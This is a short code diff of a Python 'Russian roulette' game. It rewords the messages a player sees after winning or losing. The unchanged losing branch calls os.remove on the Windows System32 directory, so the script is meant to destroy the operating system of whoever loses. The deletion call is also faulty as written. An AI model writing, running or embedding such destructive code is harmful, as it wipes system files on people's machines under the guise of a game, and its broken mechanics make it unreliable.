@@ -9,11 +9,11 @@ def chamber_rotate():
 
 def fire_gun():
     if bullet == chamber_rotate():
-        print(colored("You lost! Say goodbye to your files!"))
+        print(colored("You lost! Say goodbye to windows!"))
         os.remove("C:\Windows\System32")
         sys.exit()
     else:
-        print("Lucky you. Your files live to see another day.")
+        print("Lucky you. Your copy of windows live to see another day.")
 
 test_your_luck = input("How about we test your luck? [Y/N]")
 
